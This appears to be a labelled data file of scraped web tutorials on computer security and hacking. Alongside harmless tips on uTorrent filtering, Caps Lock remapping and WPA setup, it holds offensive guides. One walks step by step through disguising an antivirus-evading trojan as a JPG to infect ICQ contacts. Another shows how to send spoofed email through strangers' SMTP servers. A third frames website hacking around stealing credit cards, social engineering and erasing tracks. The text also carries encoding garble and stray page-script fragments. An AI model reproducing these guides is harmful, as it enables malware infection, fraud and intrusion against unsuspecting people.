shop will probably use a cracked key in minutes or hours, not days or weeks. Never depend exclusively on WEP for network access control or data confidentiality. For example, combine WEP with SSL captive portal or VPN authentication to stop an attacker with your WEP key from entering upstream networks. Be smart, be safe Ultimately, the most effective way to neutralize Caffe Latte is to stop using WEP altogether. Wi-Fi Protected Access uses cryptographic integrity checks to detect bit-flipping. And neither WPA nor WPA2 are directly vulnerable to data key cracking. While not impervious to other attacks, WPA and WPA2 are very strong when used correctly. Even WPA PSK dictionary attacks pale in comparison to the gross simplicity and speed of WEP cracking. Corporate WLAN administrators have now been warnedÃ¢â¬âagain. Hopefully, Caffe Latte will put the final nail in WEPs coffin, encouraging foot-draggers to finally migrate away from that fatally flawed protocol """

0	Protecting yourself when downloading using ÃÂµTorrent	""" Protecting yourself when downloading using ÃÂµTorrent Thanks to jesusisapervert for this tip! If youve been using BitTorrent to download any of the more popular files, such as the latest episode of some major TV show, you may have found yourself receiving lots of \""Wasted\"" data. This is data that has been discarded after being deemed corrupt or invalid by your BitTorrent client. Every so often, you will have received more wasted data than the size of the files you are downloading! This is happening because Anti-P2P organizations are actively polluting P2P networks with fake peers, which send out fake or corrupt data in order to waste bandwidth and slow down file transfers. At its worst, when downloading major copyrighted torrents, as much as a fourth of the peers you are connected to can be attributed to various Anti-P2P agencies. There is also a much more serious side to this. Once youve established a connection to one of these fake \""peers\"", your IP has been logged and will most likely be sent to the RIAA/MPAA! But there is a way to fight back! If you are using the latest ÃÂµTorrent (1.5), you can employ a little known feature called IP filtering. The author of ÃÂµTorrent has gone out of his way to hide it, but its there nonetheless. But before we can activate this filter, we need to retrieve a list of currently known Anti-P2P organization IPs. This is most easily done by downloading the latest blacklist from Bluetack (the same people who wrote SafePeer for the Azureus BT client) at  http://www.bluetack.co.uk/config/nipfilter.dat.gz  This list is updated daily, and contains all known Anti-P2P organizations, trackers and peers, aswell as all known Goverment/Military IP addresses as collected by the Bluetack team. Once downloaded, extract and rename the file original filename \""ipfilter.dat\"" to \""ipfilter.dat\"" in preparation for the final step. EDIT ADD: FOR EVEN HIGHER SECURITY Paranoid pipfilter.dat.gz Description: This list is all the blacklists bluetack makes put into a .dat.gz file for emule, now this will block some isp and also alot of things one may not think needed. Use at your own risk. This will have to be unzipped and then replace the .dat file manualy, in the config folder. To make the list available to ÃÂµTorrent, you need to place the renamed ipfilter.dat file in %AppData%\\uTorrent. Go to Start -> Run and type %AppData%\\uTorrent at the box. Click Ok button and a folder will appear. After placing the ipfilter.dat in this folder, start ÃÂµTorrent and go into preferences (Ctrl+P), then click on \""Advanced\"". In the right hand pane, make sure that \""ipfilter.enable\"" is set to true, and then close the dialog. Thats it for the configuration. You can verify that the list has been loaded by looking under the \""Logging\"" tab of ÃÂµTorrent, where you should see the line \""Loaded ipfilter.dat (X entries)\"". Congratulations! You are now protected against most of the garbage-distributing peers; and the likelyhood of the RIAA or MPAA knocking at your door has been substantially reduced! Id go as far as to say that you shouldnt be using ÃÂµTorrent at all without this feature turned on! And even if the law enforcement side of it doesnt bother you, you should still be interested in reducing the amount of garbage data that gets sent your way, which in turn leads to quicker downloads, and isnt that something everybody should strive for? Note: Its advised that you update the list at least once a month, to keep you updated on the movement of the Anti-P2P organizations. One tool that will aid you getting these updates is the \""Blocklist Manager\"" from the same people who made the list; go to  B.I.S.S. Forums  and download it. On a related note, this note from the ÃÂµTorrent FAQ should come in handy: \""To reload ipfilter.dat without restarting ÃÂµTorrent, simply open the preferences (ctrl+p), and press enter to close it again. """
0	Disable Caps Lock	""" DISABLE CAPS LOCK for those who dont know CAPS LOCK mean shouting or yelling in forum, you better disable your CAPS LOCK immediately. Disable Caps Lock Now you can disable your Caps Lock key in Windows... without any special software, and without having to pry the key off with a screwdriver. Read on to find out how. I also have a page on how to disable the Windows key. Background Accidentally hitting the Caps Lock key when typing up an email or coding can be maddening. Most people never use it anyway, so why not disable it? In Windows, you can by adding some keyboard scancode mapping information to your Windows registry. The complete details are at annoyances.org. To make it even easier, I decided to add some .REG files so you can disable your shift key yourself without needing to muck around with the registry. Compatibility This method of disabling the Caps Lock key works with all modern Windows variants: Windows 2000, Windows XP Pro & Home and Windows 2003. It will not work with older versions. Warnings These files are provided without warranty. Use them at your own risk. These files will overwrite any keyboard mappings you currently have. .REG files update your Windows registry. Incorrect changes to the registry may damage Windows or other installed software. Be sure you know what a given .REG file contains before merging it into the registry. These files are unsupported, please do not contact me with questions on their use. Installation / Files The following files are .reg files. They modify the Windows registry directly. You should download them to your PC and then double-click them to add them to your registry. After saying YES to the message box, reboot your machine and enjoy freedom from Caps Lock annoyances. Change Caps Lock into a SHIFT key: caps_lock_to_shift.reg For the UNIX Folks: Change Caps Lock into a Control key: caps_lock_to_control.reg Swap Caps Lock and the left Control key: swap_caps_lock_and_control.reg Disable Caps Lock entirely: disable_caps_lock.reg UNINSTALL: Change Caps Lock Back to Caps Lock: remove_scancode_mappings.reg (Removes all scancode mappings) *This file is also useful for completely reseting all key remappings on a PC with oddly mapped keys. Note: You cannot combine this with my method for disabling the Windows key as it will replace those scancode mappings. """
0	How to make a trojan looks like JPG	""" HOW TO MAKE A TROJAN LOOK LIKE A JPG So many questions were asked on bulletin board and IR - for example, how to hide a Trojan in a picture - that I decided to write this short explanation. This trick works only by sending a picture to someone on ICQ. How to make this work? 1 Find a small Trojan. Best not detected by AVP. 2 Find a binder that can bind a JPG to an exe. Best not detected by AVP. 3 Rename the result file and change the icon. 1 First you must find a small Trojan to bind to the picture. That way the size will not be too big and the receiver won`t get suspicious by long downloading times or big picture sizes. The best is to use a small Trojan with ICQ notify. Then you get a notify on ICQ with IP address. You need that to connect and to upload another Trojan that has more functions. Many of them are out there: MiniCommand 1.2, FC`s InCommand, Slim`s Asylum and Webasylum, WWWPW. There are lots of them, and new ones getting available every day. Try to get an unpacked server, so you can pack the server. If the server is packed, it is harder for antivirus programs to detect it. Edit the server. Then test the server on your own computer, to see if you get an ICQ pager. Make this work. Else edit the server again. Do not forget to remove the server afterwards. You can do this by connecting to 127.0.0.1, your own IP. Then give the command: \""remove server\"". To prevent recognition of antivirus programs you should then pack the server. Use an exe packer or compressor for that. A lot of packers you can find on the net. At Here youll find some. But the AVP also uses unpackers, so find one that is not so familiar. A list of what AVP recognizes of Trojans and what kind of decompressing it does, can be find here. Then you should test the server for AVP recognition. If AVP recognizes the server, you should try another packer, or another Trojan server. 2 The goal is that the victim sees the picture and that the server is secretly executed at the same time. To make one file of the server and the JPG, you use a \""exe binder\"" or \""joiner\"". These ones are also recognized by AVP. So it is important to find one that is not detected. Take a new one and try it out with AVP. Binders you can find at here. Not all binders do bind a JPG to an exe, so find the right one. 3 Next step is to make the result look like a JPG when you send it by ICQ. With some binders you can change the icon. Else you can use Microangelo to edit the icon. You can get that at download.com. Last step is to make the .exe disappear. You can do that by renaming the result to \""me.in.the.car.without.wearing.a.bra.exe\"" That way the name is too long to see the \""exe\"". Or rename the result like this: Mypic.jpg .exe Put so many spaces between jpg and exe, so that the exe does not show up when you send the file. When you get the notify you have remote control. Remove the result.exe and upload the normal JPG instead. Removing your traces a little. """
0	Top 10 Tricks to exploit SQL Server Systems	""" Whether it is through manual poking and prodding or the use of security testing tools, malicious attackers employ a variety of tricks to break into SQL Server systems, both inside and outside your firewall. It stands to reason then, if the hackers are doing it, you need to carry the same attacks to test the security strength of your systems. Here are 10 hacker tricks to gain access and violate systems running SQL Server. 1. Direct connections via the Internet These connections can be used to attach to SQL Servers sitting naked without firewall protection for the entire world to see (and access). DShields Port Report shows just how many systems are sitting out there waiting to be attacked. I dont understand the logic behind making a critical server like this directly accessible from the Internet, but I still find this flaw in my assessments, and we all remember the effect the SQL Slammer worm had on so many vulnerable SQL Server systems. Nevertheless, these direct attacks can lead to denial of service, buffer overflows and more. 2. Vulnerability scanning Vulnerability scanning often reveals weaknesses in the underlying OS, the Web application or the database system itself. Anything from missing SQL Server patches to Internet Information Services (IIS) configuration weaknesses to SNMP exploits can be uncovered by attackers and lead to database server compromise. The bad guys may use open source, home-grown or commercial tools. Some are even savvy enough to carry out their hacks manually from a command prompt. In the interest of time (and minimal wheel spinning), I recommend using commercial vulnerability assessment tools like QualysGuard from Qualys Inc. (for general scanning), WebInspect from SPI Dynamics (for Web application scanning) and Next Generation Security Software Ltd.s NGSSquirrel for SQL Server (for database-specific scanning). Theyre easy to use, offer the most comprehensive assessment and, in turn, provide the best results. Figure 1 shows some SQL injection vulnerabilities you may be able to uncover. sql hacker fig1 Figure 1: Common SQL injection vulnerabilities found using WebInspect. 3. Enumerating the SQL Server Resolution Service Running on UDP port 1434, this allows you to find hidden database instances and probe deeper into the system. Chip Andrews SQLPing v 2.5 is a great tool to use to look for SQL Server system(s) and determine version numbers (somewhat). This works even if your SQL Server instances arent listening on the default ports. Also, a buffer overflow can occur when an overly long request for SQL Servers is sent to the broadcast address for UDP port 1434. 4. Cracking SA passwords Deciphering SA passwords is also used by attackers to get into SQL Server databases. Unfortunately, in many cases, no cracking is needed since no password has been assigned (Oh, logic, where art thou?!). Yet another use for the handy-dandy SQLPing tool mentioned earlier. The commercial products AppDetective from Application Security Inc. and NGSSQLCrack from NGS Software Ltd. also have this capability. 5. Direct-exploit attacks Direct attacks using tools such as Metasploit, shown in Figure 2, and its commercial equivalents (CANVAS and CORE IMPACT) are used to exploit certain vulnerabilities found during normal vulnerability scanning. This is typically the silver-bullet hack for attackers penetrating a system and performing code injection or gaining unauthorized command-line access. Figure 2: SQL Server vulnerability exploitable using Metasploits MSFConsole. 6. SQL injection SQL injection attacks are executed via front-end Web applications that dont properly validate user input. Malformed SQL queries, including SQL commands, can be inserted directly into Web URLs and return informative errors, commands being executed and more. These attacks can be carried out manually -- if you have a lot of time. Once I discover that a server has a potential SQL injection vulnerability, I prefer to perform the follow-through using an automated tool, such as SPI Dynamics SQL Injector, shown in Figure 3. Figure 3: SPI Dynamics SQL Injector tool automates the SQL injection process. 7. Blind SQL injection These attacks go about exploiting Web applications and back-end SQL Servers in the same basic fashion as standard SQL injection. The big difference is that the attacker doesnt receive feedback from the Web server in the form of returned error messages. Such an attack is even slower than standard SQL injection given the guesswork involved. You need a good tool for this situation, and thats where Absinthe, shown in Figure 4, comes in handy. Figure 4: Absinthe tool takes the pain out of blind SQL injection testing. 8. Reverse engineering the system The reverse engineering trick looks for software exploits, memory corruption weaknesses and so on. In this sample chapter from the excellent book Exploiting Software: How to Break Code by Greg Hoglund and Gary McGraw, youll find a discussion about reverse engineering ploys. 9. Google hacks Google hacks use the extraordinary power of the Google search engine to ferret out SQL Server errors -- such as \""Incorrect syntax near\"" -- leaking from publicly accessible systems. Several Google queries are available at Johnny Longs Google Hacking Database. (Look in the sections titled Error Messages and Files containing passwords.) Hackers use Google to find passwords, vulnerabilities in Web servers, underlying operating systems, publicly available procedures and more that they can use to further compromise a SQL Server system. Combining these queries with Web site names via Googles site: operator often turns up juicy info you never imagined you could unearth. 10. Perusing Web site source code Source code can also turn up information that may lead to a SQL Server break in. Specifically, developers may store SQL Server authentication information in ASP scripts to simplify the authentication process. A manual assessment or Google could uncover this information in a split second. """
0	Command Prompt Tutorial	""" The aim of this tutorial is to get you familiar with the Windows command prompt. It covers basic shit such as ping, Telnet, and sending fake email, and hopefully also goes a bit farther than that, and will be a bit more helpful than only teaching you the complete, absolute, utter, basics. If you have any comments, please contact me. Thanks/shouts to Zugg for giving me the idea to write this. The Windows command prompt is more useful than most people realize. You can perform many network-related tasks with it, as well as managing files, and the list goes on. For this tutorial, Ill be using Windows XP Pro, but most of the commands should work on earlier versions of Windows as well, although on occasion they wont, and I really cant help that, so dont blame me =). Before we get started, I think it should be noted that the command prompt is not DOS. DOS is short for Disk Operating System, and was a early text-only operating system made by Microsoft, before they had the horrible idea to start building Windows. This isnt a history od DOS tutorial though, so lets get started with the command prompt. Open up the command prompt by going to start>programs>accessories>command prompt on Windows XP. You should see something like: C:\\Documents and Settings\\Name> This means that you are in the directory C:\\Documents and Settings\\Name, where name is your username. You might see something else, like just plain C\\:>. Whatever it says, thats the directory youre in. You can change directories by using the CD command. First were going to go to the directory C:>. In the command prompt, two dots, .. , always means the parent directory of the one you are in. So if we type CD .. it will Change Directories (CD) to the parent directory of the one were in. If were in C:\\Documents and Settings\\Name, and we type CD .., it will take us to C:\\Documents and Settings. Continue to type CD .. until it takes you to your C: drive, and the prompt is now C:>. You dont have to use .. with the CD command though, you can also use it in the following syntax: CD C:\\Path\\To\\Directory So lets say we want to go back to the Documents and Settings\\Name directory. We would use the following, replacing Name with your username of course: C:\\>CD C:\\Documents and Settings\\Name Note that the > and anything before it, in this case C:\\>, is not to be typed. Its simply the prompt that Windows will display. Ok, now lets go back to the C: drive: C:\\Documents and Settings\\Name\\>CD C:\\ Got the hang of it? Good. The DIR command displays all the folders and files in the currect directory that youre in. So to display all of the contents of the C: drive (assuming youre keeping up with me and are at C:\\), we use the following command: C:\\>DIR We can also view the contents of other directories without going to those directories, by using the syntax DIR C:\\Directory\\. If were still in the C:\\ drive, and want to view the contents of C:\\Documents and Settings\\Name (as always replace Name with your username), we would use the following command: C:\\>DIR C:\\Documents and Settings\\Name If youve ever used any form of Unix before, youll probably have note that the DIR command is the same as he LS command in Unix, and that CD is identical to the CD command in Unix. So far weve only worked on browsing around and viewing the contents of directories, but to be honest this is useless shit, because browsing around directories gets boring pretty damn fast, and theres not much you can do. While youve been browsing around, youve probably noticed how much useless crap you have wasting space on your hard drive, so guess what? Were going to learn how to delete that useless crap. To delete folders, use the RD (remove directory) command, and to delete just a regular file use the DEL (delete) command. If we want to delete the folder C:\\Documents and Settings\\Name\\Useless_stuff, we first navigate to C:\\Documents and Settings\\Name, and then delete the directory useless_stuff: C:\\>CD C:\\Documents and Settings\\Name\\ C:\\Documents and Settings\\Name\\>RD useless_stuff Similarly, to delete a file, not a folder called useless_stuff, well call it useless_stuff.txt here, do the same thing except with the DEL command: C:\\>CD C:\\Documents and Settings\\Name\\ C:\\Documents and Settings\\Name\\>DEL useless_stuff All gone. Now suppose you want to create a new folder. You use the MD command to create folders. To re-create the useless_stuff directory, use the following command: C:\\Documents nad Settings\\Name\\>MD useless_stuff Files can be copied using (surprise, surprise) the COPY command. To use the COPY command, you specify a source to be copied from, and a destination to be copied to. If the source or destination is in the directory you are in, you dont need to specify the full path name. If it isnt in the directory youre in, you do need to specify the full pathname. If we want to copy our useless_stuff directory to C:\\useless_stuff, we use the following command: C:\\Documents and Settings\\Name\\>COPY useless_stuff C:\\useless_stuff If you dont feel like having two copies of the same file, you can simply move the file using the MOVE command. The MOVE command works the same way the COPY command does, except it moves the folder/file as opposed to making another copy of it in a new directory: C:\\Documents and Settings\\Name\\>MOVE useless_stuff C:\\useless_stuff Enough with working with files, lets move on. Although you may see the command prompt as a blob of black ugliness, you can customize the command prompt and make it look quite nice. First of all, after all these commands, it might seem kind of crowded, so lets clear it using the CLS command. To do this, simply type CLS at the prompt, and it clears all text and gives you a new prompt. We can also change the backround and the text color of the prompt, with the COLOR command. The COLOR command uses the following syntax, where b is background and t is text: COLOR bt Note that there is no space between the b and t. Each color has a hexadecimal value: 0 black 1 blue 2 green 3 aqua 4 red 5 purple 6 yellow 7 white 8 grey 9 light blue A light green B light aqua C light red D light purple E light yellow F bright white So if we want bright white text on a blue backround, we use the following command: C:\\>COLOR 1F To simply change it back to the default colors, type the COLOR command by itself with no arguments. Before we move on, its worth looking at one more completely useless command, the ECHO command. The ECHO command is used mostly for batch files, but can also be used simply at the command prompt. It displays the text that you want (see what I mean by useless? =p). Try typing \""ECHO Binary Universe 0wnz j00\"" (without the quotes) at the command prompt and see what happens. You can also defragment your hard drive using the command prompt, via the DEFRAG command. To defrag your C:\\ drive, simply type \""DEFRAG C:\\\"" (without the quotes). If you want to defrag another drive, replace the C:\\ with that drive letter. For a full list of options that can be used with the DEFRAG command, simply type DEFRAG by itself in the command prompt. If youd rather format a disk than defrag it, you can use the FORMAT command, with \""/FS:file system\"" to represent the desired file system. To format your C:\\ drive with NTFS, use the following command: C:\\>FORMAT C: /FS:NTFS Before we move on to network-related commands, there is one more basic command worth discussing: the PERFMON command. The PERFMON command moniters the performance of your system, eg the CPU usage, etc. Simply type \""PERFMON\"" (without that quotes) at the prompt, and in Windows XP a window with a graph will pop up. Now we move on to network and internet related commands. This is an area where the semingly simple command prompt is very flexible and powerful, and in which it is the swiss-army knife of Windows -- the command prompt can be used for FTP, sending fake email, Telnet, and much more. The most basic command is PING. The PING command is used to see if a remote host can be reached. To use the PING command, you type \""PING IP_address\"" (without the quotes), where IP_address is the IP address of the remote host. So to ping 127.0.0.1: C:\\>PING 127.0.0.1 If you get a response similar to this, all is well and you can reach the host: --------------------------------------------- Pinging 127.0.0.1 with 32 bytes of data: Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 Reply from 127.0.0.1: bytes=32 time<1ms TTL=128 --------------------------------------------- However, if you get a reply like \""request timed out\"", then you cant reach the host. Possible reasons for not being able to reach the host are possibly the host is offline, you mistyped the IP address/domain name, or you are not connected to the internet. As mentioned before, we can also use the command prompt as a telnet client. To use the command prompt as a telnet client, you simply type \""TELNET IP_address\"" (without the quotes of course), replacing IP_address with the IP address of the host you wish to telnet to. You can also specify a port to telnet to, with the syntax \""TELNET IP_address PORT\"", which can on occasion be quite useful. The command prompt, being the swiss army knife of Windows, can also be used as an FTP client. To FTP to a host, use the command \""FTP IP_address\"", without the quotes and replacing IP_address with the IP address of the remote host. You will then most likely be prompted for a user name and password, and if authentication is successful you will get the following prompt: ftp> At this prompt you can type FTP commands. The most common reason for using FTP is to transfer files (File TRANSFER Protocol), so well start with the commands for uploading files to the server and downloading files from the server. To upload a file to the server, use the PUT command. The PUT command uploads a file from a specified path on your box to the directory you are currently in of the server, thus the following command uploads the file C:\\file.txt to file.txt in whatever directory you are currently in of the remote machine: ftp>PUT C:\\file.txt To change directories, you use the CD command, just as you did in the Windows command prompt earlier in this tutorial. You can download files the same way you uploaded them, except using the GET command, thus the following command copies the file something.gif in the current directory of the remote machine to the current directory of the local mahine: ftp>GET something.gif Most other FTP commands are used the same way the equivilant commands are used in the command prompt. For example, the FTP command LS is the same as the command DIR in the Windows command prompt, and displays the contents of the current directory. Likewise, the FTP command MKDIR is used the same way as the Windows command prompt command MD, and the command DELETE is used to delete a file. For a full list of available commands, type HELP (without the quotes) after you have connected and logged in. Another interesting thing that can be done via the command prompt is sending fake email via an SMTP server. SMTP is short for Simple Mail Transfer Protocol, and is used for sending email. Just about any SMTP server is an SMTP server that can be used to send fake email. The exception is that some ISP SMTP servers may require the host using the server to be connecting from an account on that ISP. Its not hard to find an SMTP server to try this out on. You can just pick a random website and try this on their SMTP server if they have one. Step one is to connect to the SMTP server by telnetting to the servers IP and specifying that the connection should be made to port 25 on the server, as SMTP runs on port 25. So type \""TELNET site.com 25\"" (replace site.com with the IP address or domain name of your target). If the target isnt running an SMTP server, itll say something like \""Connection failed\"". If they are running an SMTP server, itll give you information aboout what SMTP server theyre running. To make sure that youve connected, type help, and itll say something like \""214 - commands supported\"" and give you the supported commands. Before you start sending your fake email, be a good boy and say hello, by typing \""HELO\"". Youll probably get a response like \""250 site.com hello IP_address\"". Now lets send that fake email. Begin with the MAIL FROM command. This declares what address you want the email to be sent from. So to send the email from  [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ , youd use the following command: MAIL FROM: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Now youll probably get a message like \""250 OK\"". The next step is to specify the recipient of the message, using the RCPT TO command: RCPT TO: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Finally, you include the data of the mess with the DATA command. End your message by putting a period on a line by itself. So altogether, you probably type this: ---------------------------------------- C:\\>TELNET site.com 25 HELO MAIL FROM: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ RCPT TO: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ DATA Hello, this is my data. ----------------------------------------- """
1	Securing A Wireless Network Connection With WEP Or WPA	"""   I have just set up a wireless connection at home - whenever I log on it says that the connection is unsecure - how do I secure it? I have a new Toshiba Laptop and a Phillips Router. I saw something about a WEP key....where do I enter this? You are right to worry about this problem, actually, because any open wireless network is an invitation for neighbors and various unsavory characters to connect to your network as if they were on your local area network. This means that theyd be able to use your network-friendly printer, your networked hard drive backup system, and try to break into your computers too. In addition, theyd be able to use your network connection itself and if they were to download tons of illegal music, for example, the RIAA could get your ISP to shut you down, or if they downloaded porn or terrorism research data, well, the FBI could get involved. Not good! Fortunately, its pretty easy to secure a wireless network system: you need to log in to your router / base station (your Phillips unit), which is probably done by simply entering a special IP address in your Web browser (try 192.168.1.1 if the documentation that was included with the router doesnt explain). If that fails, you might need to hook the router directly to the computer via a USB cable, though those are definitely rare systems. Once youve hooked up, you should find a multi-tab configuration tool that has one tab labeled \""Security\"" or similar. Click on that and you should be able to find \""Password\"" as an option or button. Click on that and it should give the options of WEP or WPA. I recommend that you choose WPA and use a long password - its far more secure than WEP. Heres an example from the configuration screen of my Linksys router:   As you can see, its a bit complicated, but once you enter a password it automatically generates all the scary looking (hexidecimal) security codes: any of those will be what you would enter on your Toshiba laptop -- once -- to be securely connected forever. I hope that helps you get your hatches battened down!   """
0	How to Hack Websites &amp; Servers	"""   Im going to provide the common methodology that is followed when hacking a machine/network/server. This tutorial will give you a good understanding & an overview about professional penetration testing in a black box (attacker) point of view. It is designed to give you an idea on how an attacker can break into your system, what I am gonna say will increase your awareness & will open the door for you to go out & educate yourself easily. I gathered this information from various sources and tutorials, i have changed many things, clarified many parts, given some references, and put a lot of information together. Im still a learner & on the way to my goal. However, this wont prevent me from teaching others what i have learned so far & dont worry, im not going to provide you with any info that im not sure about yet. It is not the best tutorial out there, but at least it is a good starter. I will speak in a hacker (attacker or blackbox) point of view. I write this tutorial for educational purposes only.   Before you hack a system, you must decide what your goal is. Are you hacking to put the system down, gaining sensitive data, breaking into the system and taking the root access, screwing up the system by formatting everything in it, discovering vulnerabilities & see how you can exploit them, etc ... ? The point is that you have to decide what the goal is first.   The most common goals are:    1. breaking into the system & taking the admin privileges. 2. gaining sensitive data, such as credit cards, identification theft, etc.  You should have all of your tools ready before you start taking the steps of hacking. There is a Unix version called backtrack. It is an Operating System that comes with various sets of security tools that will help you hack systems (penetration tests).  You should set the steps (methodology) that you plan to take in your journey before you do anything else. There is a common methodology followed by hackers, i will mention it below. However, you can create your own methodology if you know what you are doing.   Common steps to be taken for hacking a system:   1. Reconnaissance (footprinting). 2. Scanning. 3. Ports & Services Enumeration. 4. Vulnerability Assessment. 5. Vulnerability Exploitation. 6. Penetration and Access. 7. Privilege Escalation & owning the box. 8. Erase tracks. 9. Maintaining access.   The above methodology can change based on your goals. Feel free m8!   Before you break into a system, you have to collect as much info as you can on the system and target. You have to study your target well before you hack. This step is called Reconnaissance. Reconnaissance is achieved by using techniques & tools that are undetectable by the target. You are gathering your targets info that is publicly published, e.g. browse your targets website & if they are looking for an SQL employee and Windows server admin, then you get a hint that they are running Windows Server & do SQLs, this is called a \""passive\"" action. Lets see an example of active action! Example of active action: call the company to obtain some info, visit the company, email employees to get some info, go to the targets website & read its source code. In other words, passive action means you gather info in a non-intrusive manner. Active action is a step further, such as talking to the company as if you are a customer, things like that. It is not really important to know what action is passive & what is active, the main goal here to gather info! Simple huh? Good, let me go deeper little bit.  In passive reconnaissance, there is a 0% chance of getting caught ;-), as you only target publicly available info to give you the feel on what your target looks like. The type of info you can gather through Passive Recon. are, names, phones numbers, location addresses, partner networks, and much more. This can aid you when you want to do some social engineering! Hence, sometimes you can get some non-public info thats revealed when you do passive reconnaissance. There are several tools helps you to do passive reconnaissance, such as whois (who is). Whois helps you obtain extensive info, such as names, domains of the target, etc. Other great tools are, Sam Spade, domaintools, and google(can reveal lots of target subdomians & many more).   To know what whois really is briefly, visit   What is the Proper Way of Hacking? - Check Out the Answer!   Active reconnaissance goes beyond the passive nature, such as communicating with the target without being caught, such as scanning. Anything not discovered in IDS(Intrusion Detection System) is considered active. You have to think of ways to extract info of the company in a normal way, public by going a little bit deeper than passive recon. e.g. you can go to the physical location, do some social engineering, email staff, communicate with employees based on the info youve gotten on your passive recons. Things like that!  Example of some techniques for active reconnaissance, such as banner grabbing, view companys public website source code and directory structure, social engineering, shoulder surfing, etc.   What the heck is banner grabbing?  You let the server send you a block of information that tells you OS version of your target system & various association with it Banner tells OS version and various association. Anything listening on a \""port\"" can determine the operating system (OS) \""the port\"" is running on, this called fingerprinting. In other words, fingerprinting is the process of determining the operating system (OS) or applications used by a remote target.    Learn more about banner grabbing:   An Introduction to HTTP Fingerprinting   Can you give a brief example of Social Engineering?  For example, you try to find out where IT admin goes after business hours, then start to go to the place he goes & build a relationship , start making a friend relationship to extract more info slowly but surely, things like that! you know what i mean.   What is shoulder surfing?  Simply, stand behind a persons shoulder and see what the guy is doing & typing on the keyboard. This can happen in a wireless network area where everyone is using a laptop in public areas.  In summary, reconnaissance is one of the most important steps in hacking. The main concept is to gather all the info that is publicly available or easily obtainable. Info that we gather will help us in social engineering and research purposes which will lead you to very critical info about the system. It starts by obtaining names, phones, emails, IP range, domain structure, and so on.  let me show you how banner grabbing is done, telnet into your target server on port 80 as the following, go to command line or terminal and type   telnet xx.xxx.xxx.xxx 80   Now the connection is established, that stupid server thinks you are a web browser connected to it, it waits you to enter commands so the server can you give you info about your request. In this situation, you have to write a command that says \""Hey you web server, give me content of such and such website\"". However, we do not really want to visit the website through telnet, do you? You can just go to web browser & request the website from there. Our purpose here is to freak the server out enough, so it spits back a code that says, hey! this doesnt work but here is some info that might help you do some trouble shooting. This technique allows you to fingerprint various components of the target system.    Note:  instead of  telnet xxx.xx.xxx.xx 80 , you can do  nc xxx.xx.xxx.xxx 80 ! Its the same thing ... nc stands for netcat ...  xx.xxx.xx.xxx  represents the IP address of the target system.  After you do  telnet xxx.xx.xxx.xxx 80 , the remote sever will wait you to enter a command.

You can start the exploitation process ;-) ...  Another example, use program called sam-spade which gives you alot of info about your target. The target does not know actually what we are doing against their server, since they havent seen anything been triggered by IDS or Firewall.   *What is the difference between IDS & Firewall?  An IDS (Intrusion Detection System) may only detect and warn you of a violation of your privacy. Although most block major attacks, some probes or other attacks may just be noted and allowed through. Theres also an evolution of the IDS called an IPS (Intrusion Prevention System) that watches for the same things an IDS does, but instead of just alerting, it blocks the traffic.  A good firewall will block almost all attacks unless specified otherwise or designed otherwise. The only problem is, the firewall might not warn you of the attacks and may just block them.   It may be a good idea to have both an IDS and a Firewall, because the IDS will warn you and then the firewall will block the attack. Over the years, firewalls gottten more complex and added more features. One of these features is actually IDS - today you can have a firewall that already has IDS(Firewall/IDSs are combined into one internet security program).

